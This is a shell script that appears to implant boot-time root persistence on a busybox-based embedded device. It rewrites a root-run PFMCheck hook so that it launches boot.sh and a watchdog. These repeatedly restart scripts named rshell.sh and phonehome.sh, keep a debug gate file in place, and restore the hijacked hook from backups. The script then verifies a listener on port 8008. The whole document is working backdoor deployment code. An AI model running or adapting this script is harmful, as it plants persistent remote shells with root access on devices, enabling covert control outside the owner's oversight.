export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
BB=/usr/local/bin/busybox

echo "=== CURRENT PFM PAYLOAD ==="
cat /var/local/pfmParse/PFMCheck 2>&1
echo "=== PLATFORM ==="
cat /var/local/pfmParse/Data/platform.txt 2>&1
echo "=== GATE ==="
ls -l /var/local/DebugPowerup 2>&1
echo "=== PAYLOAD LOG ==="
cat /var/local/alvidaa/payload.log 2>&1
echo "=== ALVIDAA DIR ==="
ls -la /var/local/alvidaa 2>&1

echo "=== CLEANUP DUPLICATES ==="
ps 2>/dev/null | grep -v grep | grep 'phonehome\.sh' | awk '{print $1}' | while read p; do
    kill -9 "$p" 2>/dev/null && echo "killed phonehome $p"
done
rm -f /APPS/.alvidaa/shell_listener.sh /APPS/.alvidaa/shell_listener.sh.off
echo "cleanup done"

echo "=== DEPLOY boot.sh ==="
mkdir -p /var/local/alvidaa
cat > /var/local/alvidaa/boot.sh <<'BOOT_EOF'
#!/bin/sh
# alvidaa boot persistence: called from the PFM lane (uid 0) after boot.
BB=/usr/local/bin/busybox
LOG=/var/local/alvidaa/boot.log
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
say() { echo "$(date) $*" >> "$LOG"; }
say "boot.sh start uptime=$(cut -d' ' -f1 /proc/uptime 2>/dev/null)"
ps 2>/dev/null | grep -v grep | grep -q 'rshell\.sh' || {
    $BB setsid /bin/sh /var/local/alvidaa/rshell.sh >/dev/null 2>&1 < /dev/null &
    say "rshell started pid=$!"
}
ps 2>/dev/null | grep -v grep | grep -q 'phonehome\.sh' || {
    $BB setsid /bin/sh /var/local/alvidaa/phonehome.sh >/dev/null 2>&1 < /dev/null &
    say "phonehome started pid=$!"
}
touch /var/local/DebugPowerup 2>/dev/null
chmod 644 /var/local/DebugPowerup 2>/dev/null
sleep 3
say "listen8008=$(grep -ci ':1F48' /proc/net/tcp 2>/dev/null) rshell=$(ps 2>/dev/null | grep -v grep | grep -c 'rshell\.js')"
BOOT_EOF
chmod 755 /var/local/alvidaa/boot.sh

cp -f /APPS/.alvidaa/phonehome.sh /var/local/alvidaa/phonehome.sh 2>/dev/null
chmod 755 /var/local/alvidaa/phonehome.sh 2>/dev/null
echo "--- phonehome.sh ---"
cat /var/local/alvidaa/phonehome.sh 2>&1

echo "=== DEPLOY WATCHDOG ==="
cat > /var/local/alvidaa/watchdog.sh <<'WD_EOF'
#!/bin/sh
BB=/usr/local/bin/busybox
while true; do
    sleep 60
    touch /var/local/DebugPowerup 2>/dev/null
    ps 2>/dev/null | grep -v grep | grep -q 'rshell\.sh' || $BB setsid /bin/sh /var/local/alvidaa/rshell.sh >/dev/null 2>&1 < /dev/null &
    ps 2>/dev/null | grep -v grep | grep -q 'rshell\.js' || $BB setsid /bin/sh /var/local/alvidaa/rshell.sh >/dev/null 2>&1 < /dev/null &
    ps 2>/dev/null | grep -v grep | grep -q 'phonehome\.sh' || $BB setsid /bin/sh /var/local/alvidaa/phonehome.sh >/dev/null 2>&1 < /dev/null &
    [ -f /var/local/pfmParse/PFMCheck ] || { mkdir -p /var/local/pfmParse/Data; cp -f /var/local/alvidaa/PFMCheck.bak /var/local/pfmParse/PFMCheck 2>/dev/null; cp -f /var/local/alvidaa/platform.bak /var/local/pfmParse/Data/platform.txt 2>/dev/null; chmod 644 /var/local/pfmParse/PFMCheck /var/local/pfmParse/Data/platform.txt 2>/dev/null; }
done
WD_EOF
chmod 755 /var/local/alvidaa/watchdog.sh

echo "=== REBUILD PFMCheck (boot hook -> boot.sh) ==="
cat > /var/local/pfmParse/PFMCheck <<'PFM_EOF'
runSignal=PFM
runCount=99
runMaxCount=1
mkdir -p /var/local/alvidaa
{ /usr/local/bin/busybox id; date; cat /proc/uptime; } > /var/local/alvidaa/proof.txt 2>&1
chmod 755 /var/local/alvidaa; chmod 644 /var/local/alvidaa/proof.txt 2>/dev/null
cp -f /var/local/pfmParse/PFMCheck /var/local/alvidaa/PFMCheck.bak 2>/dev/null; cp -f /var/local/pfmParse/Data/platform.txt /var/local/alvidaa/platform.bak 2>/dev/null; chmod 644 /var/local/alvidaa/PFMCheck.bak /var/local/alvidaa/platform.bak 2>/dev/null
echo "alvidaa payload ran $(date) uid=$(/usr/local/bin/busybox id -u)" >> /var/local/alvidaa/payload.log 2>/dev/null
( sleep 25; /bin/sh /var/local/alvidaa/boot.sh ) >/dev/null 2>&1 &
( sleep 45; /bin/sh /var/local/alvidaa/watchdog.sh ) >/dev/null 2>&1 &
( sleep 40; mkdir -p /var/local/pfmParse/Data; cp -f /var/local/alvidaa/PFMCheck.bak /var/local/pfmParse/PFMCheck 2>/dev/null; cp -f /var/local/alvidaa/platform.bak /var/local/pfmParse/Data/platform.txt 2>/dev/null; touch /var/local/DebugPowerup; chmod 644 /var/local/pfmParse/PFMCheck /var/local/pfmParse/Data/platform.txt /var/local/DebugPowerup 2>/dev/null; sync ) >/dev/null 2>&1 &
sync
PFM_EOF
chmod 644 /var/local/pfmParse/PFMCheck
cp -f /var/local/pfmParse/PFMCheck /var/local/alvidaa/PFMCheck.bak
chmod 644 /var/local/alvidaa/PFMCheck.bak
touch /var/local/DebugPowerup
chmod 644 /var/local/DebugPowerup

echo "=== START WATCHDOG NOW ==="
$BB setsid /bin/sh /var/local/alvidaa/watchdog.sh >/dev/null 2>&1 < /dev/null &
echo "watchdog pid=$!"
$BB setsid /bin/sh /var/local/alvidaa/phonehome.sh >/dev/null 2>&1 < /dev/null &
echo "phonehome pid=$!"
sleep 2

echo "=== VERIFY ==="
ls -l /var/local/pfmParse/PFMCheck /var/local/pfmParse/Data/platform.txt /var/local/DebugPowerup /var/local/alvidaa/
echo "--- listen ---"
grep -i ':1F48' /proc/net/tcp
echo "--- procs ---"
ps 2>/dev/null | grep -v grep | grep -E 'rshell|phonehome|watchdog'
echo "=== DONE ==="
exit
